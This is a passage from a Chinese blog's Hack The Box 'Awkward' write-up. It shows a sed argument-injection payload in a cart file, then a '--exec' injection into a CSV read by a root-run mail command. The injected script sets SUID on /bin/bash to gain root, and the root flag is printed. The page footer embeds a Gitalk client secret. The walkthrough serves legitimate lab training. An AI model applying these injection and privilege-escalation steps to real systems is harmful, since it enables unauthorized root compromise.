+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/KYqHRotuHTuY2rpPIxX8gqZRLC1495Wsi3qTqpLcWxs.png" class>
+
+<p>然后修改一下参数，加入下面的参数</p>
+<pre><code class="bash">1/&#39;+-e+&quot;1e+/tmp/shell.sh&quot;+/tmp/shell.sh+&#39;
+</code></pre>
+<p>然后我们需要修改在 &#x2F;cart 中创建的文件，不幸的是我们没有操作权限，所以我们选择删除这个文件，然后自己创建一个</p>
+<pre><code class="bash">bean@awkward:/var/www/store/cart$ ls
+b1b9-7006-2d9-74bc
+bean@awkward:/var/www/store/cart$ cp b1b9-7006-2d9-74bc bak
+bean@awkward:/var/www/store/cart$ rm -rf b1b9-7006-2d9-74bc 
+bean@awkward:/var/www/store/cart$ cp bak b1b9-7006-2d9-74bc
+bean@awkward:/var/www/store/cart$ vi b1b9-7006-2d9-74bc 
+bean@awkward:/var/www/store/cart$ cat b1b9-7006-2d9-74bc 
+***Hat Valley Cart***
+item_id=1&#39; -e &quot;1e /tmp/shell.sh&quot; /tmp/shell.sh &#39;&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90
+</code></pre>
+<p>然后我们抓一个删除商品的包</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/3oUIuzXPTBfkS_5VW2BUWSPDKeieNH2Wtx79zXp1ouE.png" class>
+
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/c2kb5YS27NqycwXtnWllo20DaFGqjJTSp7368GOkJ8Y.png" class>
+
+<p>修改好以后执行</p>
+<p>这边拿到的是 www-data 的权限</p>
+<p>去执行一下 pspy</p>
+<p>当有新的请假请求的时候，会调用 mail 命令拼接对应 csv 文件中的 name</p>
+<pre><code class="bash">2023/03/12 05:12:09 CMD: UID=0     PID=74503  | mail -s Leave Request: christopher.jones christine
+</code></pre>
+<pre><code class="bash">www-data@awkward:/tmp$ cat exploit.sh
+#!/bin/bash
+chmod +s /bin/bash
+
+www-data@awkward:/tmp$ chmod 777 exploit
+
+www-data@awkward:/tmp$ cd /var/www/private
+
+www-data@awkward:~/private$ echo &#39;&quot; --exec=&quot;\!/tmp/exploit.sh&quot;&#39; &gt;&gt; leave_requests.csv
+&lt;&quot; --exec=&quot;\!/tmp/exploit.sh&quot;&#39; &gt;&gt; leave_requests.csv
+www-data@awkward:~/private$ ls -la /bin/bash
+
+ls -la /bin/bash
+-rwsr-sr-x 1 root root 1396520 Jan  7  2022 /bin/bash
+</code></pre>
+<pre><code class="bash">www-data@awkward:~/private$ /bin/bash -p
+/bin/bash -p
+whoami&amp;&amp;id
+root
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+</code></pre>
+<p>成功提权到 root 权限</p>
+<pre><code class="bash">cat /root/root.txt
+5d3d649dfbaf5f418cdca5f79012eafa
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/&title=《Awkward - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/&title=《Awkward - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Awkward - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2023/05/07/Hackthebox/Hackthebox-Photobomb/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Photobomb - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/03/06/Hackthebox/Hackthebox-Networked/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Networked - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/&title=《Awkward - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/&title=《Awkward - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Awkward - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACo0lEQVR42u3aQWrDQAwF0Nz/0il0VSh2vqRRksXzKqTBnjeFkSzp8Yiv5+/19/PVN/+v5G5Xv0nuduDCw8PDay39/nb3mHvA/ffP4ErWcLkePDw8vDXe/Pi+/6bH7q0HDw8P73t4SXjohY29bcLDw8P7LK/3m7zA0fuMh4eH9yleUgiollzniXIefg7UWvDw8PBqPak3HeIbwWClv4eHh4fX6qrnB30eNqobN7nw8PDwNnjJ43vDWPmBPkmyo4CBh4eHd5Q3f70/O1KQj2RFYDw8PLwFXvL+Xi3j5glxdXHVgIGHh4e3x0uO/l5pNQH3Gl3l/xgeHh7eUV4vMFSLtr30Ok/BD8c9PDw8vIvn9pr3kwO6mjpPtg8PDw9vm9e8RXGAoDoflRdzRzVmPDw8vNYkQELKN6WHSRpd1YEGPDw8vA1e/vI/HwI4VbwolyTw8PDwFnh546p6NJ/aiGZaj4eHh7fGS9LZPP3NN27y12gleHh4eAu8XoM/T3arQ1SnEn08PDy8PV51FCAvDVTDT29W6sUa8PDw8I7yqguqdufzZlgvzLy4Ax4eHt4aL29rTYq2vYVWSxuX9Wk8PDy8o7y8QFA97ufsUbEYDw8Pb5k3eflPgke1WDxPtfHw8PA2eMmxnh/HkxJDcudq2wwPDw/v/bxqypsPHMyLHYUwgIeHh7fAy0sAk4ZWPoCVbC4eHh7eN/B6AaBXis0XOopveHh4eAu8Z/GqNvjzMkQvPLzYejw8PLwF3kbwmDSo8jGs3kADHh4e3ine2dGrXnH2bCkZDw8P7z28Uw2qvIDbe1Z5s/Dw8PC+gDcpWEx+mQcJPDw8vO/hTZLvXkrdKwHj4eHhvYd3akAqR1aftTJAgIeHh7d2nWpN5VszHyDAw8PDW+D9AMQ45CmQFUnxAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
